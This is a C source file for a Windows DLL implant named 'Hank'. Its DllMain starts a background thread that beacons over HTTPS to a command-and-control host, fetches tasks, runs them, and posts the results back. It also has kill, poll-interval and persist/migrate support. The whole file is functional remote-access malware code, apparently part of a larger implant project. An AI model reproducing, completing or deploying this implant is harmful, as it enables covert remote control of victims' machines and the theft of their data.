#define Hank_EXPORTS
#include "exports.h"

/*
 * exports.c - DLL entry points and the HTTPS beaconing loop.
 *
 * Each poll cycle now makes two independent HTTPS round-trips:
 *
 *   1. POST /beacon  body: TLV(MSG_AGENT_GET_TASK)
 *      Response body: TLV(MSG_SERVER_TASK) or TLV(MSG_SERVER_NO_TASK)
 *
 *   2. POST /beacon  body: TLV(MSG_AGENT_POST_RESULT)   [only if task received]
 *      Response body: TLV(MSG_SERVER_ACK)
 *
 * Each round-trip opens a fresh TCP connection and performs a full TLS
 * handshake so the server sees clean, stateless HTTPS requests.
 */

#define C2_HOST_BUFFER_LENGTH    64U
#define C2_PORT_BUFFER_LENGTH    16U
#define POLL_THREAD_WAIT_TIMEOUT_MS 5000U
#define POLL_LOOP_STOPPED        0L
#define POLL_LOOP_RUNNING        1L
#define TERMINATION_NOT_REQUESTED 0L
#define TERMINATION_REQUESTED    1L
#define KILL_NOT_PENDING         0L
#define KILL_PENDING             1L

static WCHAR          G_C2Host[C2_HOST_BUFFER_LENGTH] = DEFAULT_C2_HOST;
static WCHAR          G_C2Port[C2_PORT_BUFFER_LENGTH] = DEFAULT_C2_PORT;
static WCHAR          G_DllPath[MAX_PATH] = { 0 };
static HANDLE         G_PollThread = NULL;
static volatile LONG  G_ShouldRun = POLL_LOOP_STOPPED;
static volatile LONG  G_TerminationRequested = TERMINATION_NOT_REQUESTED;
static volatile LONG  G_KillPending = KILL_NOT_PENDING;
static volatile LONG  G_PollIntervalMs = (LONG)DEFAULT_POLL_INTERVAL_MS;

/* ---------------------------------------------------------------------------
 * Internal helpers
 * ------------------------------------------------------------------------- */

static VOID ClosePollThreadHandle(BOOL waitForExit)
{
    HANDLE pollThread = (HANDLE)InterlockedExchangePointer(
        (PVOID volatile*)&G_PollThread, NULL);

    if (pollThread == NULL) return;

    if (waitForExit && GetCurrentThreadId() != GetThreadId(pollThread))
    {
        (void)WaitForSingleObject(pollThread, POLL_THREAD_WAIT_TIMEOUT_MS);
    }

    CloseHandle(pollThread);
}

static VOID PollServerOnce(VOID)
{
    AGENT_GET_TASK_REQUEST getTaskRequest;
    TLS_CONTEXT            ctx = { 0 };
    TLV_MESSAGE            taskMsg = { 0 };
    PBYTE                  commandResult = NULL;
    DWORD                  commandResultLength = 0;
    DWORD                  commandStatus = NO_ERROR;
    DWORD                  taskId = 0;
    DWORD                  commandId = 0;
    TASK_HEADER* taskHeader = NULL;
    PBYTE                  taskArgs = NULL;

    getTaskRequest.agentId = DEFAULT_AGENT_ID;

    /* ---- Round-trip 1: request a task ------------------------------------ */
    if (!NetworkInit(G_C2Host, G_C2Port, &ctx)) return;

    if (!HttpSendTlvRoundTrip(
        &ctx, G_C2Host,
        MSG_AGENT_GET_TASK,
        sizeof(getTaskRequest),
        (CONST PBYTE) & getTaskRequest,
        &taskMsg))
    {
        TlsCleanup(&ctx);
        return;
    }

    TlsCleanup(&ctx);

    if (taskMsg.type != MSG_SERVER_TASK ||
        taskMsg.length < sizeof(TASK_HEADER))
    {
        FreeTlvMessage(&taskMsg);
        return;
    }

    /* ---- Execute the received task --------------------------------------- */
    taskHeader = (TASK_HEADER*)taskMsg.value;
    taskArgs = taskMsg.value + sizeof(TASK_HEADER);

    taskId = taskHeader->taskId;
    commandId = taskHeader->commandId;

    commandStatus = ExecuteCommandById(
        taskHeader->commandId,
        taskHeader->argLength,
        taskArgs,
        &commandResult,
        &commandResultLength);

    FreeTlvMessage(&taskMsg);

    /* ---- Round-trip 2: post the result ----------------------------------- */
    /* Always post the result, even when kill is pending, so the operator
     * actually sees "completed" for the kill task before the implant exits. */
    {
        TASK_RESULT_HEADER resultHeader = { 0 };
        DWORD              payloadLen;
        PBYTE              payload = NULL;
        TLS_CONTEXT        ctx2 = { 0 };
        TLV_MESSAGE        ackMsg = { 0 };

        resultHeader.agentId = DEFAULT_AGENT_ID;
        resultHeader.taskId = taskId;
        resultHeader.commandId = commandId;
        resultHeader.status = commandStatus;
        resultHeader.resultLength = commandResultLength;

        payloadLen = sizeof(resultHeader) + commandResultLength;
        payload = (PBYTE)ImplantHeapAlloc(payloadLen);

        if (payload != NULL)
        {
            CopyMemory(payload, &resultHeader, sizeof(resultHeader));
            if (commandResultLength > 0 && commandResult != NULL)
            {
                CopyMemory(
                    payload + sizeof(resultHeader),
                    commandResult,
                    commandResultLength);
            }

            if (NetworkInit(G_C2Host, G_C2Port, &ctx2))
            {
                (VOID)HttpSendTlvRoundTrip(
                    &ctx2, G_C2Host,
                    MSG_AGENT_POST_RESULT,
                    payloadLen,
                    payload,
                    &ackMsg);
                FreeTlvMessage(&ackMsg);
                TlsCleanup(&ctx2);
            }

            ImplantHeapFree(payload);
        }
    }

    if (commandResult != NULL)
    {
        ImplantHeapFree(commandResult);
    }

    /* ---- Apply deferred kill AFTER the result has been posted ------------ */
    if (G_KillPending == KILL_PENDING)
    {
        RequestImplantTermination();
    }
}

static DWORD WINAPI PollThreadProc(LPVOID parameter)
{
    UNREFERENCED_PARAMETER(parameter);

    while (G_ShouldRun == POLL_LOOP_RUNNING && !IsImplantTerminationRequested())
    {
        PollServerOnce();

        if (!IsImplantTerminationRequested())
        {
            Sleep((DWORD)G_PollIntervalMs);
        }
    }

    ClosePollThreadHandle(FALSE);
    return 0;
}

/* ---------------------------------------------------------------------------
 * DLL entry point
 * ------------------------------------------------------------------------- */

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(reserved);

    if (reason == DLL_PROCESS_ATTACH)
    {
        /* Capture full DLL path for persist / migrate commands. */
        GetModuleFileNameW(instance, G_DllPath, MAX_PATH);
    }




    if (!HankInitialize())
    {
        wprintf(L"[!] HankInitialize failed.\n");
        
        return 1;
    }

    if (!HankStart())
    {
        wprintf(L"[!] HankStart failed.\n");
        
        return 1;
    }

    return TRUE;
}

/* ---------------------------------------------------------------------------
 * Exported API
 * ------------------------------------------------------------------------- */

Hank_API BOOL HankInitialize()
{
    if (IsImplantTerminationRequested()) return FALSE;

    
    (void)wcsncpy_s(G_C2Host, ARRAYSIZE(G_C2Host), C2_HOST, _TRUNCATE);
    

   
    (void)wcsncpy_s(G_C2Port, ARRAYSIZE(G_C2Port), C2_PORT, _TRUNCATE);
    

    if (!NetworkStartup()) return FALSE;

    return TRUE;
}

Hank_API BOOL HankStart(VOID)
{
    HANDLE pollThread;

    if (IsImplantTerminationRequested()) return FALSE;
    if (G_PollThread != NULL) return TRUE;

    InterlockedExchange(&G_ShouldRun, POLL_LOOP_RUNNING);
    pollThread = CreateThread(NULL, 0, PollThreadProc, NULL, 0, NULL);
    if (pollThread == NULL)
    {
        InterlockedExchange(&G_ShouldRun, POLL_LOOP_STOPPED);
        return FALSE;
    }

    G_PollThread = pollThread;
    return TRUE;
}

Hank_API VOID HankStop(VOID)
{
    RequestImplantTermination();
    ClosePollThreadHandle(TRUE);
    NetworkShutdown();
    CheckHeapBalance();
}

VOID RequestImplantTermination(VOID)
{
    InterlockedExchange(&G_TerminationRequested, TERMINATION_REQUESTED);
    InterlockedExchange(&G_ShouldRun, POLL_LOOP_STOPPED);
}

BOOL IsImplantTerminationRequested(VOID)
{
    return (G_TerminationRequested == TERMINATION_REQUESTED);
}

/* ---------------------------------------------------------------------------
 * Implant runtime control (called by command handlers)
 * ------------------------------------------------------------------------- */

VOID SetPollInterval(DWORD ms)
{
    InterlockedExchange(&G_PollIntervalMs, (LONG)ms);
}

VOID SetKillPending(VOID)
{
    InterlockedExchange(&G_KillPending, KILL_PENDING);
}

VOID GetC2Config(PWSTR hostBuf, DWORD hostBufChars, PWSTR portBuf, DWORD portBufChars)
{
    (VOID)wcsncpy_s(hostBuf, hostBufChars, G_C2Host, _TRUNCATE);
    (VOID)wcsncpy_s(portBuf, portBufChars, G_C2Port, _TRUNCATE);
}

PCWSTR GetImplantDllPath(VOID)
{
    return G_DllPath;
}